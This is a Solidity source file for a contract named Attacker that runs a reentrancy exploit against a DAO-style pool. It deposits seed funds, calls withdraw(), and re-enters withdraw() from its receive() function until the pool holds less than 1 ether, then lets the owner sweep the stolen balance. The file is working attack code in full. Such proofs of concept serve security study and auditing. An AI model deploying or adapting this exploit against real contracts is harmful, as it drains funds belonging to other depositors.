// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

interface IDAO {
    function deposit() external payable;
    function withdraw() external;
}

/// @title Attacker
/// @notice Seeds a balance, then re-enters withdraw() from receive() to drain the pool.
contract Attacker {
    IDAO public immutable dao;
    address public immutable owner;

    constructor(address _dao) {
        dao = IDAO(_dao);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "seed with >= 1 ETH");
        dao.deposit{value: msg.value}();
        dao.withdraw(); // starts the loop
    }

    // Called automatically whenever the DAO sends ETH.
    receive() external payable {
        if (address(dao).balance >= 1 ether) {
            dao.withdraw(); // re-enter: balance not zeroed yet
        }
    }

    function loot() external view returns (uint256) {
        return address(this).balance;
    }

    function sweep() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}
